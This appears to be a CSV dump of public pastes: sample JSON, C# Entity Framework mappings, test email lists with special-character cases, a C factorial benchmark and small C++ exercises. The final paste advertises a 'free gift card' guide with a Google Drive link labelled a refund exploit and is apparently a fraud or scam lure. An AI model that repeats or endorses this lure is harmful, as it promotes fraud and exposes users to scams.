id,title,username,language,date,content
QiNJfYv4,data813,TestGuy1,JSON,Tuesday 16th of January 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'bcf7072d3645f269e61f5d8b221a9213daf4c3b876bbdc29ca50b13b7ec80c27e73b07b35e3e74e9512f2d2b7753278479f93bb51c966f0d877400dd0e3f4c7f075d0ee8d130db7b6472a9cd3384ff5a1337c36a4cd8f2f94d08925875d12ac3ec517dd51416494b0f3ad9585e12b40c9323a2ea37e2228512671b9fffad38bc',
  otherdata: [
    '059a1d4d6aae7c0b3de3811d5be3fb37',
    'c8847c83d63632f1ae643a63e2fb383d',
    '8fcdd21d96694826eb2e1cec5db59c0d',
    '2bdf126f0d0e04ad3df4ca08a253b841',
    '3b68eafb52ffdafd46b0eb39e54a105f',
    '4110c6f1e0958c9e4942a18c4ae2a998',
    '6a29c61cbadd2cb5b3cde62f020b5903',
    'e36c32588f1840deaa990444e0bb6e42'
  ]
}"
PWRdrpXE,Untitled,D3ENNY,JSON,Tuesday 16th of January 2024 05:52:08 AM CDT,"{
  ""model"": ""string"",
  ""description"": ""string"",

  ""product"": {
    ""productId"": 862,
    ""name"": ""string"",
    ""productNumber"": ""string"",
    ""color"": ""string"",
    ""standardCost"": 0,
    ""listPrice"": 0,
    ""size"": ""string"",
    ""weight"": 0,
    ""productCategoryId"": 0,
    ""productModelId"": 97,
    ""sellStartDate"": ""2024-01-15T13:08:28.142Z"",
    ""sellEndDate"": ""2024-01-15T13:08:28.142Z"",
    ""discontinuedDate"": ""2024-01-15T13:08:28.142Z"",
    ""ThumbnailPhotoFileName"" : ""qua ci sarebbe il varbinary""
  }
}"
SJf66BLT,Untitled,D3ENNY,C#,Tuesday 16th of January 2024 05:48:27 AM CDT,"modelBuilder.Entity<ProductModel>(entity =>
{
    entity.HasKey(e => e.ProductModelId).HasName(""PK_ProductModel_ProductModelID"");

    entity.ToTable(""ProductModel"", ""SalesLT"");

    entity.HasIndex(e => e.Name, ""AK_ProductModel_Name"").IsUnique();

    entity.HasIndex(e => e.Rowguid, ""AK_ProductModel_rowguid"").IsUnique();

    entity.HasIndex(e => e.CatalogDescription, ""PXML_ProductModel_CatalogDescription"");

    entity.Property(e => e.ProductModelId).HasColumnName(""ProductModelID"");
    entity.Property(e => e.CatalogDescription).HasColumnType(""xml"");
    entity.Property(e => e.ModifiedDate)
        .HasDefaultValueSql(""(getdate())"")
        .HasColumnType(""datetime"");
    entity.Property(e => e.Name).HasMaxLength(50);
    entity.Property(e => e.Rowguid)
        .HasDefaultValueSql(""(newid())"")
        .HasColumnName(""rowguid"");
});



modelBuilder.Entity<ProductDescription>(entity =>
{
    entity.HasKey(e => e.ProductDescriptionId).HasName(""PK_ProductDescription_ProductDescriptionID"");

    entity.ToTable(""ProductDescription"", ""SalesLT"", tb => tb.HasComment(""Product descriptions in several languages.""));

    entity.HasIndex(e => e.Rowguid, ""AK_ProductDescription_rowguid"").IsUnique();

    entity.Property(e => e.ProductDescriptionId)
        .HasComment(""Primary key for ProductDescription records."")
        .HasColumnName(""ProductDescriptionID"");
    entity.Property(e => e.Description)
        .HasMaxLength(400)
        .HasComment(""Description of the product."");
    entity.Property(e => e.ModifiedDate)
        .HasDefaultValueSql(""(getdate())"")
        .HasComment(""Date and time the record was last updated."")
        .HasColumnType(""datetime"");
    entity.Property(e => e.Rowguid)
        .HasDefaultValueSql(""(newid())"")
        .HasComment(""ROWGUIDCOL number uniquely identifying the record. Used to support a merge replication sample."")
        .HasColumnName(""rowguid"");
});




modelBuilder.Entity<Product>(entity =>
{
    entity.HasKey(e => e.ProductId).HasName(""PK_Product_ProductID"");

    entity.ToTable(""Product"", ""SalesLT"", tb => tb.HasComment(""Products sold or used in the manfacturing of sold products.""));

    entity.HasIndex(e => e.Name, ""AK_Product_Name"").IsUnique();

    entity.HasIndex(e => e.ProductNumber, ""AK_Product_ProductNumber"").IsUnique();

    entity.HasIndex(e => e.Rowguid, ""AK_Product_rowguid"").IsUnique();

    entity.Property(e => e.ProductId)
        .HasComment(""Primary key for Product records."")
        .HasColumnName(""ProductID"");
    entity.Property(e => e.Color)
        .HasMaxLength(15)
        .HasComment(""Product color."");
    entity.Property(e => e.DiscontinuedDate)
        .HasComment(""Date the product was discontinued."")
        .HasColumnType(""datetime"");
    entity.Property(e => e.ListPrice)
        .HasComment(""Selling price."")
        .HasColumnType(""money"");
    entity.Property(e => e.ModifiedDate)
        .HasDefaultValueSql(""(getdate())"")
        .HasComment(""Date and time the record was last updated."")
        .HasColumnType(""datetime"");
    entity.Property(e => e.Name)
        .HasMaxLength(50)
        .HasComment(""Name of the product."");
    entity.Property(e => e.ProductCategoryId)
        .HasComment(""Product is a member of this product category. Foreign key to ProductCategory.ProductCategoryID. "")
        .HasColumnName(""ProductCategoryID"");
    entity.Property(e => e.ProductModelId)
        .HasComment(""Product is a member of this product model. Foreign key to ProductModel.ProductModelID."")
        .HasColumnName(""ProductModelID"");
    entity.Property(e => e.ProductNumber)
        .HasMaxLength(25)
        .HasComment(""Unique product identification number."");
    entity.Property(e => e.Rowguid)
        .HasDefaultValueSql(""newid()"")
        .HasComment(""ROWGUIDCOL number uniquely identifying the record. Used to support a merge replication sample."")
        .HasColumnName(""rowguid"");
    entity.Property(e => e.SellEndDate)
        .HasComment(""Date the product was no longer available for sale."")
        .HasColumnType(""datetime"");
    entity.Property(e => e.SellStartDate)
        .HasComment(""Date the product was available for sale."")
        .HasColumnType(""datetime"");
    entity.Property(e => e.Size)
        .HasMaxLength(5)
        .HasComment(""Product size."");
    entity.Property(e => e.StandardCost)
        .HasComment(""Standard cost of the product."")
        .HasColumnType(""money"");
    entity.Property(e => e.ThumbNailPhoto).HasComment(""Small image of the product."");
    entity.Property(e => e.ThumbnailPhotoFileName)
        .HasMaxLength(50)
        .HasComment(""Small image file name."");
    entity.Property(e => e.Weight)
        .HasComment(""Product weight."")
        .HasColumnType(""decimal(8, 2)"");

    entity.HasOne(d => d.ProductCategory).WithMany(p => p.Products).HasForeignKey(d => d.ProductCategoryId);

    entity.HasOne(d => d.ProductModel).WithMany(p => p.Products).HasForeignKey(d => d.ProductModelId);
});"
HAW9Jjy1,Hashed Email With Exclude,wheresTheAnyKey,C,Tuesday 16th of January 2024 05:41:04 AM CDT,"Pasted at: 16/01/2024 11:41
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skexclude"
3W2kp9xJ,Hashed Email - Full,wheresTheAnyKey,C,Tuesday 16th of January 2024 05:41:02 AM CDT,"Pasted at: 16/01/2024 11:41
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

wojciech@sktestcomcast.net
joglo@sktestmac.com
larry@sktesthotmail.com
aardo@sktestverizon.net
debest@sktestlive.com
carroll@sktestaol.com
arathi@sktestyahoo.ca
sthomas@sktestcomcast.net
leocharre@sktestyahoo.ca
pedwards@sktestyahoo.com

skinclude"
5jbJtuR6,Email with Keyword SPECIAL CHARACTERS,wheresTheAnyKey,C,Tuesday 16th of January 2024 05:41:01 AM CDT,"Pasted at: 16/01/2024 11:41
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3 for TESTING PURPOSE ONLY

DATA_ID_TESTDATATOFIND NOEXCLUDES

Cooper.Kleine@findmetesting.co.uk 
Mariquilla.Evenden@findmetesting.co.uk 
Noll.Ingolotti@findmetesting.co.uk  
Grove.Feldbaum@findmetesting.co.uk
Mack.Osment@findmetesting.co.uk 
Trisha.Zanicchelli@findmetesting.co.uk
Jack.Gorriessen@findmetesting.co.uk 
Nefen.Malec@findme-testing.co.uk 
Birdie-Gemmill@findmetesting.co.uk
Rosabella.Nias@findmetesting.co.uk
Ellerey.Fanti@findmetesting.cn
Antonina.Carsey@findmetesting.cn
Valry.Shead@findmetesting.cn 
Conrade.Ferrarone@findmetesting.cn
Neysa.Fazakerley@findmetesting.cn
Cristobal.Primak@findmetesting.cn
Wakefield.Kent@findmetesting.cn
findme.Cheales@findmetesting.cn
Nert.Roddamr@findmetesting.cn 
Richy.Raft@findmetesting.cn
Berget.Kermannes@findmetesting.ie 
Shelden.Tregea@findmetesting.ie 
Allsun.Badrick@findmetesting.ie 
Hortense.Ivkovic@findmetesting.ie
Carolin.Potte@findmetesting.ie
Benjie.Trumble@findmetesting.ie
Andrew.Hadgkiss@findmetesting.ie
Trula.Kuna@findmetesting.ie
Tommie.Maytum@findmetesting.ie
Langsdon.Pakes@findmetesting.ie
Porty.Tooth@findmetesting.au
Rozella.Siggefindmetesting.au
Nolie.Tumultyfindmetesting.au
Dud.Caustonfindmetesting.au
Alvinia.Brameldfindmetesting.au
Meridel.Lymbournefindmetesting.au
Elvis.Maleckfindmetesting.au
Brett.Oughtonfindmetesting.au
Rickard.Clemfindmetesting.au
Prue.Firemanfindmetesting.au
Uriel.Rozenbaum@findmetesting25.com
Cindie.Greeson@findmetesting25.com
Laurette.Puckham@findmetesting25.com
Eldredge.Ricket@findmetesting25.com
Alanah.Rapper@findmetesting25.com
Ash.Le.Prevost@findmetesting25.com
Galvin.Purchon@findmetesting25.com
Lauryn.Ilson@findmetesting25.com
findme.Graffin@findmetesting25.com
Edithe.Trehearne@findmetesting25.com
Den.Cancutt@findmetesting10.com
Wernher.Spatoni@findmetesting10.com
Malchy.Ion@findmetesting10.com
Leona.Whitby@findmetesting10.com
Alphonse.Goodlake@findmetesting10.com
Gran.Standen@findmetesting10.com
Barnie.Gilffilland@findmetesting10.com
Kaylyn.Ditchfield@findmetesting10.com
Dorotea.Kohlerman@findmetesting10.com
Gillan.Lampel@findmetesting10.com
Patrica.Mannakee@findustesting.com
Pippo.Sewart@findustesting.com
Lanae.Cousin@findustesting.com
Porter.Glaysher@findustesting.com
Herschel.Yaakov@findustesting.com
findme.Parsand@findustesting.com
Lucho.Cosh@findustesting.com
Cullie.Powlesland@findustesting.com
Edy.Burkart@findustesting.com
Christophorus.Ackeroyd@findustesting.com
Arvy.Rowson@findUStesting.com
Arlan.Ivanilov@findustesting.com
Tawnya.Waslin@findustesting.com
Inigo.Gyrgorcewicx@findustesting.com
Sharity.Stoodley@findustesting.com
Ginger.Dresse@findustesting.com
Deck.Jouannot@findustesting.com
Deny.Soanes@findustesting.com
james@findmetesting.com

Wenona.Moverley@findqatesting.com
Jerry.Poynter@findqatesting.com
Drugi.Neeson@findqatesting.com
Winny.Binfield@findqatesting.com
Darill.Greenshiels@findqatesting.com
Ethelin.Pinchen@findqatesting.com
Tanney.Ballendine@findqatesting.com
Ariadne.Wincott@findqatesting.com
Winnie.Domm@findqatesting.com
Rogerio.Cudbird@findqatesting.com
Yu@findmetesting.com

RIGHT OF @
findme@findme.testing.com
wildcard@findme*testing.com
dash@findme-testing.com
slash@findme/testing.com
questionmark@findme?testing.com

ACCENTS
Pål@findmetesting.com
Magdalène@findmetesting.com
Anaël@findmetesting.com
Lén@findmetesting.com
Loïs@findmetesting.com
Thérèsa@findmetesting.com
Valérie@findmetesting.com
Görel@findmetesting.com
Mélia@findmetesting.com
Joséphine@findmetesting.com
Loïc@findmetesting.com
findme@findmetesting.com
Méghane@findmetesting.com
Nuó@findmetesting.com
Lén@findmetesting.com
Eliès@findmetesting.com
André@findmetesting.com
Mahélie@findmetesting.com
Méthode@findmetesting.com
Rachèle@findmetesting.com
Mélina@findmetesting.com
Gaëlle@findmetesting.com
Céline@findmetesting.com
Bérangère@findmetesting.com
Françoise@findmetesting.com
Séverine@findmetesting.com
Måns@findmetesting.com
Adèle@findmetesting.com
Aimée@findmetesting.com
Mélia@findmetesting.com
Gösta@findmetesting.com
Laurène@findmetesting.com
Gisèle@findmetesting.com
Mélinda@findmetesting.com
Bécassine@findmetesting.com
Ruì@findmetesting.com
Zoé@findmetesting.com
Maëline@findmetesting.com
Aimée@findmetesting.com
Andréanne@findmetesting.com
Adélaïde@findmetesting.com
Laurène@findmetesting.com
Anaé@findmetesting.com
Noëlla@findmetesting.com
Anaël@findmetesting.com
Maëlyss@findmetesting.com
Lucrèce@findmetesting.com
Lén@findmetesting.com
Marie-thérèse@findmetesting.com
Maéna@findmetesting.com
Hélène@findmetesting.com
Hélèna@findmetesting.com
Méng@findmetesting.com
Crééz@findmetesting.com
Mélanie@findmetesting.com
Frédérique@findmetesting.com
Médiamass@findmetesting.com
André@findmetesting.com
Cinéma@findmetesting.com
Mégane@findmetesting.com
Amélie@findmetesting.com
Nadège@findmetesting.com
Rébecca@findmetesting.com
Médiamass@findmetesting.com
Céline@findmetesting.com
Maïly@findmetesting.com
Maï@findmetesting.com
Maëlann@findmetesting.com
Noëlla@findmetesting.com
Laurélie@findmetesting.com
Ruì@findmetesting.com
Chloé@findmetesting.com
Gaëlle@findmetesting.com
Vénus@findmetesting.com
Frédérique@findmetesting.com
Amélie@findmetesting.com
Loïs@findmetesting.com
Marlène@findmetesting.com
Stévina@findmetesting.com
Clémentine@findmetesting.com
Mégane@findmetesting.com
Méng@findmetesting.com
André@findmetesting.com
Crééz@findmetesting.com
Aí@findmetesting.com
Uò@findmetesting.com
Yú@findmetesting.com
Marie-françoise@findmetesting.com
Uò@findmetesting.com
Inès@findmetesting.com
Océane@findmetesting.com
Marie-ève@findmetesting.com
Rébecca@findmetesting.com
Zoé@findmetesting.com
Lài@findmetesting.com
Rachèle@findmetesting.com
Cécile@findmetesting.com
Maïlys@findmetesting.com
Garçon@findmetesting.com
hereiam@testing.com

It's a game of per%entage percentage.
Findme#testing Findme testing.
Over&over&over Over over over.
[findmeinbrackets], findmeinbrackets
(findmeinbrackets), findmeinbrackets
<findmeinbrackets>, findmeinbrackets
{findmeinbrackets>}, findmeinbrackets
http://findme-testing.here.com
http:\\findme-testing.here.com

Vestibulum ante ipsum primis in faucibus orci luctus et ultrices Garçon@findmetesting.com cubilia Curae; Mauris viverra diam vitae quam. Suspendisse potenti. 
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Ellerey.Fanti@findmetesting.cn risus. Praesent lectus.

Vivamus metus arcu, adipiscing findmetesting@findmetesting.com, hendrerit at, vulputate vitae, nisl.

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
Jmu0r2HE,Tempos de execução de fatorial for e recursivo,jacknpoe,C,Tuesday 16th of January 2024 05:37:59 AM CDT,"#include <time.h>
#include <stdio.h>
#include <locale.h>

#define ITERACOES 200000000
#define CORTEFATORIAL 20

long fatorial_recursivo( long n) {
  if(n == 0)
    return 1;
  else
    return n * fatorial_recursivo(n-1);
}

inline long fatorial_recursivo_inline( long n)
	{ return n ? n * fatorial_recursivo_inline(n-1) : 1; }

long fatorial_for( long n) {
	long temp = 1, indice;
	for( indice = 1; indice <= n; indice++) temp *= indice;
	return temp;
}

inline long fatorial_for_inline( long n) {
	long temp = 1, indice;
	for( indice = 1; indice <= n; indice++) temp *= indice;
	return temp;
}

inline long fatorial_foo( long n) {
	long temp = 1, indice;
	for( indice = 1; indice <= n; indice++) temp *= indice;
	return temp;
}

int main() {
	clock_t clock1, clock2;
	long acumulador, indice;

    setlocale( LC_ALL, """");     // para imprimir corretamente caracteres em português
    
	printf(""Resolução: %d tiques por segundo.\n\n"", CLOCKS_PER_SEC);
	printf(""Por favor, configure o ambiente antes de continuar.\n"");
	system( ""PAUSE"");
	printf(""\n"");

	// Fatorial Foo para evitar algum desvio de performance
	acumulador = 0;
	clock1 = clock();
	for( indice = 0; indice < ITERACOES; indice++)
		acumulador += fatorial_foo( indice % CORTEFATORIAL);
	clock2 = clock();

	printf(""Fatorial foo: %1.3fs (%d)\n"", ((double) clock2 - clock1 ) / CLOCKS_PER_SEC, acumulador);

	// Fatorial Recursivo
	acumulador = 0;
	clock1 = clock();
	for( indice = 0; indice < ITERACOES; indice++)
		acumulador += fatorial_recursivo( indice % CORTEFATORIAL);
	clock2 = clock();

	printf(""Fatorial recursivo: %1.3fs (%d)\n"", ((double) clock2 - clock1) / CLOCKS_PER_SEC, acumulador);

	// Fatorial Recursivo Inline
	acumulador = 0;
	clock1 = clock();
	for( indice = 0; indice < ITERACOES; indice++)
		acumulador += fatorial_recursivo_inline( indice % CORTEFATORIAL);
	clock2 = clock();

	printf(""Fatorial recursivo inline: %1.3fs (%d)\n"", ((double) clock2 - clock1) / CLOCKS_PER_SEC, acumulador);

	// Fatorial For
	acumulador = 0;
	clock1 = clock();
	for( indice = 0; indice < ITERACOES; indice++)
		acumulador += fatorial_for( indice % CORTEFATORIAL);
	clock2 = clock();

	printf(""Fatorial for: %1.3fs (%d)\n"", ((double) clock2 - clock1) / CLOCKS_PER_SEC, acumulador);

	// Fatorial For Inline
	acumulador = 0;
	clock1 = clock();
	for( indice = 0; indice < ITERACOES; indice++)
		acumulador += fatorial_for_inline( indice % CORTEFATORIAL);
	clock2 = clock();

	printf(""Fatorial for inline: %1.3fs (%d)\n"", ((double) clock2 - clock1 ) / CLOCKS_PER_SEC, acumulador);

	printf(""\n"");
	system( ""PAUSE"");
}"
f1PqjrN5,06. Truck Tour,Spocoman,C++,Tuesday 16th of January 2024 05:25:48 AM CDT,"#include <iostream>
#include <string>
#include <queue>

using namespace std;

int main() {
    int pumps, fuel, distance;
    cin >> pumps;
    cin.ignore();

    queue<int> fuelTankPumps;

    string pump;

    for (int i = 0; i < pumps; i++) {
        getline(cin, pump);
        fuel = stoi(pump.substr(0, pump.find(' ')));
        distance = stoi(pump.substr(pump.find(' ') + 1));
        fuelTankPumps.push(fuel - distance);
    }

    int fuelQuantity = 0, index = 0;

    for (int i = 0; i < pumps; i++) {
        fuelQuantity += fuelTankPumps.front();
        fuelTankPumps.push(fuelTankPumps.front());
        fuelTankPumps.pop();

        if (fuelQuantity < 0) {
            fuelQuantity = 0;
            index = i + 1;
        }
    }

    cout << index << endl;
    return 0;
}"
AsAt2JmY,Итераторы в методах контейнера,prizrak567890,C++,Tuesday 16th of January 2024 05:20:24 AM CDT,"#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <set>

using namespace std;

template<typename T> 
void PrintRange(T tbegin,T tend) {
    auto a = tbegin;
    while (tbegin != tend) {
        cout << *tbegin;
        if (++a != tend) {
            cout << "" "";
        }
        ++tbegin;
    }
    cout << endl;
    
}

template <typename T4, typename T5>
void EraseAndPrint(T4 &container, T5 it) {

    auto it_erase = container.erase(it);
    PrintRange(container.begin(), it_erase);
    PrintRange(it_erase, container.end());
}


int main() {
    vector<string> langs = {""Python""s, ""Java""s, ""C#""s, ""Ruby""s, ""C++""s};
    EraseAndPrint(langs, langs.begin());
    return 0;
}"
1nA1umhU,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Tuesday 16th of January 2024 05:05:43 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_669682.pdf
 
Working as of
16 January 2024"
